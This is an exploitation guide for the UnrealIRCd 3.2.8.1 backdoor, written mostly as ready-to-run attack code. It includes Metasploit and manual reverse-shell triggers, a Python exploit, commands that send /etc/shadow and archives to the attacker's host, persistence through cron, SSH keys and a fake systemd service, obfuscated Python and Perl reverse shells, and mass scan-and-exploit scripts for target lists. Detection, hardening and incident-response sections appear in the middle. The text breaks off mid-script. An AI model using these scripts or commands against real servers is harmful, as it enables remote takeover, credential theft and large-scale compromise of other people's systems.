
# 🔐 IRC (Port 6667) - UnrealIRCd Exploitation Guide

## 🎯 Vulnerability Overview

**Service:** UnrealIRCd (Internet Relay Chat Daemon)
**Port:** 6667/tcp (standard IRC), 6697/tcp (IRC over SSL)
**Vulnerable Version:** UnrealIRCd 3.2.8.1
**CVE:** CVE-2010-2075
**Vulnerability Type:** Backdoor/Remote Code Execution
**Severity:** Critical (CVSS 10.0)

### Description
UnrealIRCd 3.2.8.1 contains a backdoor that was inserted when the development servers were compromised. The backdoor allows remote attackers to execute arbitrary commands by sending specially crafted data to the IRC server. The backdoor is triggered by sending "AB" followed by a system command.

---

## 🔍 Reconnaissance Workflow

### Step 1: Service Detection

#### Port Scanning
```bash
# Quick IRC port scan
nmap -p 6667,6697 <target-ip>

# Service version detection
nmap -sV -p 6667,6697 <target-ip>

# Comprehensive IRC enumeration
nmap -sV -sC -p 6667,6697 --script irc-* <target-ip>

# Check for additional IRC ports
nmap -p 6660-6669,7000,8067 <target-ip>
```

#### Banner Grabbing
```bash
# Direct IRC connection
nc <target-ip> 6667

# Using telnet
telnet <target-ip> 6667

# IRC client connection test
echo "USER test test test :test" | nc <target-ip> 6667
echo "NICK test" | nc <target-ip> 6667
```

#### IRC Server Information
```bash
# Get server information
{
    echo "NICK testuser"
    echo "USER test 0 * :test user"
    sleep 2
    echo "VERSION"
    echo "INFO"
    echo "QUIT"
} | nc <target-ip> 6667

# Expected response should show UnrealIRCd version
```

### Step 2: IRC Protocol Analysis

#### Basic IRC Commands
```bash
# IRC protocol basics for testing
NICK <nickname>          # Set nickname
USER <user> <mode> <unused> :<realname>  # User registration
JOIN #<channel>          # Join channel
PRIVMSG <target> :<message>  # Send private message
VERSION                  # Server version
INFO                     # Server information
QUIT                     # Disconnect
```

#### Server Capabilities
```bash
# Test server capabilities
{
    echo "NICK scanner"
    echo "USER scanner 0 * :scanner"
    sleep 2
    echo "CAP LS"
    echo "ADMIN"
    echo "LUSERS"
    echo "QUIT"
} | nc <target-ip> 6667
```

---

## 💥 Exploitation Workflow

### Method 1: Metasploit Exploitation

#### Basic Metasploit Usage
```bash
# Start Metasploit
msfconsole

# Use UnrealIRCd backdoor exploit
use exploit/unix/irc/unreal_ircd_3281_backdoor

# Show options
show options

# Set target
set RHOSTS <target-ip>
set RPORT 6667
set LHOST <your-ip>
set LPORT 4444

# Optional: Set specific payload
set PAYLOAD cmd/unix/reverse_netcat

# Check if target is vulnerable
check

# Execute exploit
exploit
```

#### Advanced Metasploit Configuration
```bash
# Different payload options
set PAYLOAD cmd/unix/bind_netcat
set PAYLOAD cmd/unix/reverse_bash
set PAYLOAD cmd/unix/reverse_python

# Custom command execution
set PAYLOAD cmd/unix/generic
set CMD "id; whoami; uname -a"

# Timing options
set ConnectTimeout 10
set Timeout 20

# Execute with verbose output
set VERBOSE true
exploit
```

### Method 2: Manual Exploitation

#### Direct Backdoor Trigger
```bash
# Set up listener first
nc -lvnp 4444

# Send backdoor command via IRC protocol
{
    echo "AB; nc <your-ip> 4444 -e /bin/bash"
} | nc <target-ip> 6667

# Alternative format
echo "AB; /bin/bash -i >& /dev/tcp/<your-ip>/4444 0>&1" | nc <target-ip> 6667
```

#### Structured IRC Backdoor Exploitation
```bash
# Complete IRC session with backdoor trigger
{
    echo "NICK backdoor"
    echo "USER backdoor 0 * :backdoor"
    sleep 2
    echo "AB; nc <your-ip> 4444 -e /bin/sh"
    sleep 2
    echo "QUIT"
} | nc <target-ip> 6667
```

### Method 3: Python Exploitation Script

#### Automated Exploitation
```python
#!/usr/bin/env python3
import socket
import sys
import time
import threading

def exploit_unrealircd(target_ip, target_port, command):
    try:
        # Connect to IRC server
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(10)
        sock.connect((target_ip, target_port))
        
        # Receive server greeting
        greeting = sock.recv(1024)
        print(f"Server greeting: {greeting.decode().strip()}")
        
        # IRC registration (optional but good practice)
        sock.send(b"NICK exploiter\r\n")
        sock.send(b"USER exploiter 0 * :exploiter\r\n")
        
        # Wait for registration to complete
        time.sleep(2)
        
        # Send backdoor trigger with command
        backdoor_cmd = f"AB; {command}\r\n"
        sock.send(backdoor_cmd.encode())
        
        print(f"Backdoor command sent: {command}")
        
        # Receive any response
        try:
            response = sock.recv(1024)
            print(f"Server response: {response.decode()}")
        except:
            pass
        
        sock.close()
        return True
        
    except Exception as e:
        print(f"Exploitation failed: {e}")
        return False

def start_listener(port):
    """Start netcat listener"""
    import subprocess
    subprocess.Popen(["nc", "-lvnp", str(port)])

if __name__ == "__main__":
    if len(sys.argv) != 4:
        print("Usage: python3 unrealircd_exploit.py <target-ip> <your-ip> <your-port>")
        print("Example: python3 unrealircd_exploit.py 192.168.1.10 192.168.1.5 4444")
        sys.exit(1)
    
    target_ip = sys.argv[1]
    your_ip = sys.argv[2]
    your_port = sys.argv[3]
    
    print(f"Exploiting UnrealIRCd on {target_ip}:6667")
    
    # Reverse shell command
    command = f"nc {your_ip} {your_port} -e /bin/bash"
    
    print(f"Starting listener on port {your_port}...")
    print("Make sure to run: nc -lvnp {your_port}")
    
    time.sleep(2)
    
    success = exploit_unrealircd(target_ip, 6667, command)
    
    if success:
        print("[+] Backdoor triggered successfully!")
        print(f"[+] Check your listener on port {your_port}")
    else:
        print("[-] Exploitation failed")
```

### Method 4: Advanced Command Injection

#### Multiple Command Execution
```bash
# Execute multiple commands
echo "AB; id; whoami; uname -a; ps aux | head -10" | nc <target-ip> 6667

# System enumeration
echo "AB; cat /etc/passwd; cat /etc/shadow; cat /proc/version" | nc <target-ip> 6667

# Network information
echo "AB; ifconfig -a; netstat -tulpn; route -n" | nc <target-ip> 6667
```

#### Persistent Backdoor Installation
```bash
# Install persistent backdoor
echo "AB; echo '*/5 * * * * root nc <your-ip> 5555 -e /bin/bash' >> /etc/crontab" | nc <target-ip> 6667

# SSH key installation
echo "AB; mkdir -p /root/.ssh; echo 'ssh-rsa YOUR_PUBLIC_KEY' >> /root/.ssh/authorized_keys" | nc <target-ip> 6667

# Service backdoor
echo "AB; echo '#!/bin/bash' > /tmp/backdoor.sh; echo 'nc <your-ip> 6666 -e /bin/bash' >> /tmp/backdoor.sh; chmod +x /tmp/backdoor.sh; /tmp/backdoor.sh &" | nc <target-ip> 6667
```

#### Data Exfiltration
```bash
# Exfiltrate sensitive files
echo "AB; cat /etc/passwd | nc <your-ip> 7777" | nc <target-ip> 6667
echo "AB; cat /etc/shadow | base64 | nc <your-ip> 8888" | nc <target-ip> 6667

# Compress and exfiltrate
echo "AB; tar czf /tmp/exfil.tar.gz /etc /home /root 2>/dev/null; nc <your-ip> 9999 < /tmp/exfil.tar.gz" | nc <target-ip> 6667
```

### Method 5: Batch Exploitation Script

#### Multi-target Scanner and Exploiter
```bash
#!/bin/bash
# UnrealIRCd mass scanner and exploiter

TARGET_LIST="$1"
YOUR_IP="$2"
BASE_PORT="4440"

if [ $# -ne 2 ]; then
    echo "Usage: $0 <target_list_file> <your_ip>"
    echo "Example: $0 targets.txt 192.168.1.5"
    exit 1
fi

check_unrealircd() {
    local target=$1
    echo "Checking $target for UnrealIRCd..."
    
    timeout 10 bash -c "echo 'VERSION' | nc $target 6667" 2>/dev/null | grep -i "unreal" > /dev/null
    if [ $? -eq 0 ]; then
        echo "[+] $target appears to be running UnrealIRCd"
        return 0
    else
        echo "[-] $target does not appear vulnerable"
        return 1
    fi
}

exploit_target() {
    local target=$1
    local port=$2
    
    echo "[+] Exploiting $target with reverse shell to $YOUR_IP:$port"
    
    # Start listener in background
    nc -lvnp $port &
    LISTENER_PID=$!
    
    # Send exploit
    echo "AB; nc $YOUR_IP $port -e /bin/bash" | nc $target 6667
    
    # Wait a moment for connection
    sleep 5
    
    # Kill listener if no connection
    kill $LISTENER_PID 2>/dev/null
}

# Main scanning and exploitation loop
port_counter=0
while read -r target; do
    if [[ $target == \#* ]] || [[ -z $target ]]; then
        continue
    fi
    
    if check_unrealircd "$target"; then
        current_port=$((BASE_PORT + port_counter))
        exploit_target "$target" "$current_port" &
        port_counter=$((port_counter + 1))
    fi
    
    # Small delay between targets
    sleep 2
done < "$TARGET_LIST"

echo "Exploitation attempts completed"
echo "Check listeners on ports $BASE_PORT and above"
```

---

## ✅ Post-Exploitation Activities

### Initial System Assessment
```bash
# Verify shell access and privileges
id
whoami
groups

# System information
uname -a
hostname
cat /etc/*release*

# Network configuration
ifconfig -a
ip addr show
netstat -rn
```

### IRC Service Analysis
```bash
# Check UnrealIRCd processes
ps aux | grep unreal
ps aux | grep ircd

# IRC configuration files
find / -name "*.conf" | grep -i irc
ls -la /etc/unrealircd/
ls -la /home/*/unrealircd/

# IRC logs
find / -name "*irc*" -name "*.log" 2>/dev/null
tail -50 /var/log/ircd.log 2>/dev/null
```

### Network Services Assessment
```bash
# Check all listening ports
netstat -tulpn
ss -tulpn

# IRC specific ports
netstat -an | grep -E ":(6667|6697|7000)"
lsof -i :6667

# Network connections
netstat -an | grep ESTABLISHED
ss -t state established
```

### User and Configuration Analysis
```bash
# IRC user context
cat /etc/passwd | grep -i irc
ps aux | grep ircd | grep -v grep

# UnrealIRCd configuration
find / -name "unrealircd.conf" 2>/dev/null
find / -name "ircd.conf" 2>/dev/null

# Check for IRC operators and users
grep -i "oper" /etc/unrealircd/*.conf 2>/dev/null
grep -i "admin" /etc/unrealircd/*.conf 2>/dev/null
```

### File System Analysis
```bash
# IRC related directories
ls -la /var/lib/ircd/ 2>/dev/null
ls -la /home/ircd/ 2>/dev/null
ls -la /usr/local/unrealircd/ 2>/dev/null

# Configuration and data files
find /etc -name "*irc*" 2>/dev/null
find /var -name "*irc*" 2>/dev/null

# Log files
find /var/log -name "*irc*" 2>/dev/null
```

---

## 🔧 Advanced Exploitation Techniques

### Persistence Mechanisms

#### IRC Service Backdoor
```bash
# Modify IRC configuration to include backdoor
echo "loadmodule \"backdoor.so\";" >> /etc/unrealircd/unrealircd.conf

# Create systemd service backdoor
cat > /etc/systemd/system/irc-monitor.service << 'EOF'
[Unit]
Description=IRC Monitoring Service
After=network.target

[Service]
Type=simple
User=root
ExecStart=/bin/bash -c 'while true; do nc -l -p 8888 -e /bin/bash; sleep 10; done'
Restart=always
RestartSec=30

[Install]
WantedBy=multi-user.target
EOF

systemctl enable irc-monitor.service
systemctl start irc-monitor.service
```

#### Configuration File Backdoors
```bash
# Add backdoor to IRC configuration
echo "# Maintenance command" >> /etc/unrealircd/unrealircd.conf
echo "alias maint { /bin/bash -c 'nc <your-ip> 9999 -e /bin/bash &'; };" >> /etc/unrealircd/unrealircd.conf

# Startup script modification
if [ -f /etc/init.d/unrealircd ]; then
    sed -i '/start)/a\\tnc <your-ip> 7777 -e /bin/bash &' /etc/init.d/unrealircd
fi
```

### Lateral Movement

#### IRC Network Reconnaissance
```bash
# Discover IRC network topology
grep -r "link" /etc/unrealircd/*.conf 2>/dev/null
grep -r "hub" /etc/unrealircd/*.conf 2>/dev/null

# Find other IRC servers in network
netstat -an | grep 6667
nmap -p 6667 $(ip route | grep -E "192\.168\.|10\.|172\." | awk '{print $1}' | head -5)
```

#### IRC Server Linking
```bash
# If server linking is configured, attempt to link malicious server
# This requires understanding of IRC server protocols and linking passwords

# Check for server linking configuration
grep -i "link" /etc/unrealircd/*.conf
grep -i "password" /etc/unrealircd/*.conf
```

### Information Gathering

#### IRC User and Channel Analysis
```bash
# Extract IRC user database (if accessible)
find / -name "*.db" | grep -i irc
strings /var/lib/ircd/*.db 2>/dev/null

# Check IRC logs for sensitive information
grep -r "password\|pass\|pwd" /var/log/*irc* 2>/dev/null
grep -r "PRIVMSG.*password" /var/log/*irc* 2>/dev/null
```

#### Network Intelligence
```bash
# Analyze IRC traffic patterns
if command -v tcpdump >/dev/null; then
    tcpdump -i any port 6667 -A -c 100 > /tmp/irc_traffic.txt 2>/dev/null &
    sleep 30
    kill $!
    grep -i "password\|login\|auth" /tmp/irc_traffic.txt
fi
```

---

## 🔍 Detection and Forensics

### Log Analysis
```bash
# UnrealIRCd logs
tail -f /var/log/ircd.log 2>/dev/null
find /var/log -name "*irc*" -exec tail -20 {} \;

# System logs for IRC activity
grep -i "ircd\|unreal" /var/log/syslog
grep -i "6667" /var/log/auth.log

# Check for backdoor trigger patterns
grep -i "AB;" /var/log/*irc* 2>/dev/null
```

### Network Monitoring
```bash
# Monitor IRC connections
netstat -an | grep :6667
lsof -i :6667

# Capture IRC traffic
tcpdump -i any port 6667 -A -w irc_traffic.pcap

# Real-time IRC monitoring
tcpdump -i any port 6667 -A | grep -E "(NICK|USER|PRIVMSG|AB;)"
```

### Process Analysis
```bash
# IRC daemon processes
ps aux | grep -E "(ircd|unreal)" | grep -v grep
pstree -p | grep -i irc

# Check process command lines for anomalies
ps -eo pid,ppid,cmd | grep -E "(ircd|unreal)"

# Memory analysis (if tools available)
strings /proc/$(pgrep ircd)/mem 2>/dev/null | grep -E "(password|backdoor|AB;)"
```

### File System Forensics
```bash
# Check for modified IRC files
find /etc -name "*irc*" -newer /var/log/lastlog 2>/dev/null
find /usr -name "*irc*" -newer /var/log/lastlog 2>/dev/null

# Look for backdoor artifacts
find / -name "backdoor*" 2>/dev/null
find /tmp -name "*.sh" -executable

# Check file integrity
md5sum /usr/bin/ircd 2>/dev/null
md5sum /etc/unrealircd/*.conf 2>/dev/null
```

---

## 🛡️ Security Hardening

### UnrealIRCd Security Configuration
```bash
# Update to latest version
wget https://www.unrealircd.org/unrealircd-latest.tar.gz
tar xzf unrealircd-latest.tar.gz
cd unrealircd-*
./configure --enable-ssl
make
make install
```

### IRC Service Hardening
```bash
# Edit unrealircd.conf for security
cat >> /etc/unrealircd/unrealircd.conf << 'EOF'
# Security settings
set {
    kline-address "admin@example.com";
    modes-on-connect "+iwx";
    modes-on-oper "+s";
    oper-auto-join "#opers";
    options {
        hide-ulines;
        flat-map;
        show-connect-info;
    };
    maxchannelsperuser 10;
    anti-spam-quit-message-time 10s;
};

# Restrict server access
allow {
    ip 192.168.1.0/24;
    hostname *.localdomain;
    class clients;
    maxperip 3;
};

# Deny dangerous IPs
deny ip {
    ip *@*;
    reason "Default deny";
};
EOF
```

### Firewall Configuration
```bash
# Block IRC ports externally
iptables -A INPUT -p tcp --dport 6667 -s 192.168.1.0/24 -j ACCEPT
iptables -A INPUT -p tcp --dport 6667 -j DROP
iptables -A INPUT -p tcp --dport 6697 -j DROP

# UFW configuration
ufw allow from 192.168.1.0/24 to any port 6667
ufw deny 6667
ufw deny 6697

# Save rules
iptables-save > /etc/iptables/rules.v4
```

### Service Monitoring
```bash
# IRC monitoring script
cat > /usr/local/bin/irc_monitor.sh << 'EOF'
#!/bin/bash
LOG_FILE="/var/log/irc_security.log"

# Check for UnrealIRCd version
if pgrep -f "unrealircd" > /dev/null; then
    VERSION=$(strings /usr/bin/ircd | grep "UnrealIRCd-" | head -1)
    if echo "$VERSION" | grep -q "3.2.8.1"; then
        echo "$(date): CRITICAL - Vulnerable UnrealIRCd version detected: $VERSION" >> $LOG_FILE
    fi
fi

# Monitor for backdoor trigger patterns
if [ -f /var/log/ircd.log ]; then
    if grep -q "AB;" /var/log/ircd.log; then
        echo "$(date): ALERT - Backdoor trigger pattern detected" >> $LOG_FILE
    fi
fi

# Check connection count
CONN_COUNT=$(netstat -an | grep :6667 | grep ESTABLISHED | wc -l)
if [ $CONN_COUNT -gt 50 ]; then
    echo "$(date): ALERT - High IRC connection count: $CONN_COUNT" >> $LOG_FILE
fi
EOF

chmod +x /usr/local/bin/irc_monitor.sh
echo "*/5 * * * * root /usr/local/bin/irc_monitor.sh" >> /etc/crontab
```

### SSL/TLS Configuration
```bash
# Generate SSL certificates for secure IRC
openssl req -new -x509 -days 365 -nodes -out /etc/unrealircd/ssl/server.cert.pem -keyout /etc/unrealircd/ssl/server.key.pem

# Configure SSL in unrealircd.conf
cat >> /etc/unrealircd/unrealircd.conf << 'EOF'
listen {
    ip *;
    port 6697;
    options {
        ssl;
        clientsonly;
    };
};

set {
    ssl {
        certificate "/etc/unrealircd/ssl/server.cert.pem";
        key "/etc/unrealircd/ssl/server.key.pem";
        trusted-ca-file "/etc/ssl/certs/ca-certificates.crt";
        options {
            no-starttls;
        };
    };
};
EOF
```

---

## 🚨 Incident Response

### Immediate Response Actions
```bash
# Stop IRC service immediately
systemctl stop unrealircd
pkill -f ircd
pkill -f unrealircd

# Block IRC ports
iptables -I INPUT 1 -p tcp --dport 6667 -j DROP
iptables -I INPUT 1 -p tcp --dport 6697 -j DROP

# Kill existing IRC connections
ss -K dst :6667
ss -K dst :6697
```

### Damage Assessment
```bash
# Check for backdoor usage
grep -r "AB;" /var/log/ 2>/dev/null
find /tmp -name "*backdoor*" -o -name "*shell*" 2>/dev/null

# Look for recently executed commands
find /var/log -name "*irc*" -exec grep -l "AB;" {} \;
history | grep -E "(nc|netcat|bash|sh).*[0-9]{1,5}"

# Check for system modifications
find /etc -newer /var/log/lastlog 2>/dev/null
find /bin -newer /var/log/lastlog 2>/dev/null
find /usr/bin -newer /var/log/lastlog 2>/dev/null
```

### Recovery Actions
```bash
# Remove vulnerable UnrealIRCd version
apt remove unrealircd
yum remove unrealircd

# Install patched version
wget https://www.unrealircd.org/unrealircd-latest.tar.gz
tar xzf unrealircd-latest.tar.gz
cd unrealircd-*
./configure --enable-ssl --prefix=/usr/local/unrealircd
make && make install

# Remove backdoor artifacts
rm -f /tmp/*backdoor* /tmp/*shell*
rm -f /etc/cron.d/*irc*

# Reset IRC configuration from backup
cp /etc/unrealircd/unrealircd.conf.backup /etc/unrealircd/unrealircd.conf

# Restart with secure configuration
systemctl start unrealircd
```

### Post-Incident Analysis
```bash
# Create incident timeline
cat > /tmp/irc_incident_timeline.txt << 'EOF'
IRC Incident Timeline:

1. Vulnerable UnrealIRCd 3.2.8.1 detected
2. Backdoor exploitation evidence found
3. System commands executed via AB; trigger
4. Potential data exfiltration or persistence

Evidence locations:
- IRC logs: /var/log/ircd.log
- System logs: /var/log/syslog, /var/log/auth.log
- Network traffic: captured IRC connections
- File modifications: timestamps in /etc, /tmp

Recommended actions:
- Update all systems running UnrealIRCd
- Implement network monitoring for IRC traffic
- Review and harden IRC service configuration
- Conduct security assessment of affected systems
EOF
```

---

## 📚 References and Tools

### Essential Tools
- **Metasploit Framework:** exploit/unix/irc/unreal_ircd_3281_backdoor
- **netcat:** Network utility for manual exploitation
- **Nmap:** Network scanner with IRC scripts
- **IRC clients:** HexChat, WeeChat, irssi for testing

### IRC-Specific Nmap Scripts
```bash
# Available IRC scripts
ls /usr/share/nmap/scripts/ | grep irc

# Key scripts:
irc-info.nse            # IRC server information
irc-unrealircd-backdoor.nse  # UnrealIRCd backdoor detection
```

### IRC Protocol References
```bash
# IRC protocol commands
NICK <nickname>                    # Set nickname
USER <user> <mode> <unused> :<realname>  # User registration
JOIN #<channel>                    # Join channel
PART #<channel>                    # Leave channel
PRIVMSG <target> :<message>        # Send message
NOTICE <target> :<message>         # Send notice
QUIT :<message>                    # Disconnect
PING :<server>                     # Ping server
PONG :<server>                     # Pong response
VERSION                            # Server version
INFO                               # Server info
LUSERS                            # User statistics
MOTD                              # Message of the day
```

### Online Resources
- **CVE-2010-2075:** https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-2075
- **UnrealIRCd Security:** https://www.unrealircd.org/docs/Security
- **IRC Protocol RFC:** https://tools.ietf.org/html/rfc1459
- **UnrealIRCd Documentation:** https://www.unrealircd.org/docs/

### Vulnerability Timeline
```
2009-11: UnrealIRCd development servers compromised
2010-06: Backdoored UnrealIRCd 3.2.8.1 released
2010-06: Vulnerability discovered and disclosed
2010-06: CVE-2010-2075 assigned
2010-06: Fixed version released (3.2.8.2)
```

---

## 🔬 Advanced Research Topics

### UnrealIRCd Backdoor Analysis

#### Backdoor Mechanism
```c
// Simplified backdoor code pattern in UnrealIRCd 3.2.8.1
if (strstr(buffer, "AB") == buffer) {
    // Execute command after "AB; "
    system(buffer + 3);
}
```

#### Forensic Analysis
```bash
# String analysis of vulnerable binary
strings /usr/bin/ircd | grep -A5 -B5 "AB"

# Hex analysis
hexdump -C /usr/bin/ircd | grep -A10 -B10 "41 42"  # "AB" in hex

# Binary comparison
diff <(strings /usr/bin/ircd.clean) <(strings /usr/bin/ircd.backdoor)
```

### IRC Network Security Research
```bash
# IRC network topology mapping
nmap -p 6667 --script irc-info <network-range>

# IRC server linking analysis
grep -r "link\|connect\|hub" /etc/unrealircd/*.conf

# IRC service fingerprinting
nmap -p 6667 --script irc-info,irc-unrealircd-backdoor <target>
```

### Advanced Evasion Techniques
```bash
# Base64 encoded commands
echo -n "nc 192.168.1.5 4444 -e /bin/bash" | base64
echo "AB; echo 'bmMgMTkyLjE2OC4xLjUgNDQ0NCAtZSAvYmluL2Jhc2g=' | base64 -d | bash" | nc <target> 6667

# Using different shells
echo "AB; python -c \"import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('<your-ip>',4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);\"" | nc <target> 6667

# Perl reverse shell
echo "AB; perl -e 'use Socket;\$i=\"<your-ip>\";\$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'" | nc <target> 6667
```

---

## 🔧 Automation and Mass Exploitation

### Mass Scanner Script
```bash
#!/bin/bash
# IRC Mass Scanner and Exploiter v2.0

THREADS=50
OUTPUT_FILE="irc_scan_results.txt"
EXPLOIT_LOG="irc_exploit_log.txt"

usage() {
    echo "Usage: $0 [OPTIONS] <target_file>"
    echo "Options:"
    echo "  -t <threads>    Number of threads"
    echo "  -o <output>     Output file for scan results"
    echo "  -e              Enable auto-exploitation"
    echo "  -l <logfile>    Exploitation log file"
    echo "  -h              Show this help"
}

scan_target() {
    local target=$1
    echo "[*] Scanning $target"
    
    # Check if port 6667 is open
    timeout 5 nc -zv $target 6667 &>/dev/null
    if [ $? -eq 0 ]; then
        # Get banner/version info
        response=$(timeout 10 echo "VERSION" | nc $target 6667 2>/dev/null)
        if echo "$response" | grep -qi "unreal"; then
            version=$(echo "$response" | grep -i "unreal" | head -1)
            echo "[+] $target: UnrealIRCd detected - $version"
            echo "$target:$version" >> $OUTPUT_FILE
            
            # Check for vulnerable version
            if echo "$version" | grep -q "3.2.8.1"; then
                echo "[!] $target: POTENTIALLY VULNERABLE - UnrealIRCd 3.2.8.1"
                echo "$target:VULNERABLE" >> $OUTPUT_FILE
                
                # Auto-exploitation if enabled
                if [ "$AUTO_EXPLOIT" = true ]; then
                    exploit_target $target
                fi
            fi
        else
            echo "[-] $target: IRC service detected but not UnrealIRCd"
        fi
    else
        echo "[-] $target: Port 6667 closed"
    fi
}

exploit_target() {
    local target=$1
    local port=$((4440 + RANDOM % 100))
    
    echo "[*] Attempting exploitation of $target"
    
    # Start listener in background
    nc -lvnp $port &>/dev/null &
    LISTENER_PID=$!
    sleep 2
    
    # Send exploit
    {
        echo "NICK exploiter"
        echo "USER exploiter 0 * :exploiter"
        sleep 1
        echo "AB; nc $LHOST $port -e /bin/bash"
        sleep 2
        echo "QUIT"
    } | timeout 10 nc $target 6667
    
    # Check if listener got connection
    sleep 3
    if kill -0 $LISTENER_PID 2>/dev/null; then
        # Listener still running = no connection
        kill $LISTENER_PID 2>/dev/null
        echo "[-] $target: Exploitation failed"
        echo "$target:EXPLOIT_FAILED" >> $EXPLOIT_LOG
    else
        echo "[+] $target: SUCCESSFULLY EXPLOITED"
        echo "$target:EXPLOIT_SUCCESS" >> $EXPLOIT_LOG
    fi
}

# Main execution
while getopts "t:o:el:h" opt; do
    case $opt in
        t) THREADS=$OPTARG ;;
        o) OUTPUT_FILE=$OPTARG ;;
        e) AUTO_EXPLOIT=true ;;
        l) EXPLOIT_LOG=$OPTARG ;;
        h) usage; exit 0 ;;
        *) usage; exit 1 ;;
    esac
done
shift $((OPTIND-1))

if [ $# -ne 1 ]; then
    usage
    exit 1
fi

TARGET_FILE=$1
LHOST=$(hostname -I | awk '{print $1}')

echo "[*] Starting IRC mass scan"
echo "[*] Threads: $THREADS"
echo "[*] Output: $OUTPUT_FILE"
echo "[*] Local IP: $LHOST"

if [ "$AUTO_EXPLOIT" = true ]; then
    echo "[*] Auto-exploitation: ENABLED"
    echo "[*] Exploit log: $EXPLOIT_LOG"
fi

# Create output files
> $OUTPUT_FILE
if [ "$AUTO_EXPLOIT" = true ]; then
    > $EXPLOIT_LOG
fi

# Process targets with parallel execution
export -f scan_target exploit_target
export OUTPUT_FILE EXPLOIT_LOG AUTO_EXPLOIT LHOST
xargs -a $TARGET_FILE -I {} -P $THREADS bash -c 'scan_target "$@"' _ {}

echo "[*] Scan completed. Results saved to $OUTPUT_FILE"
if [ "$AUTO_EXPLOIT" = true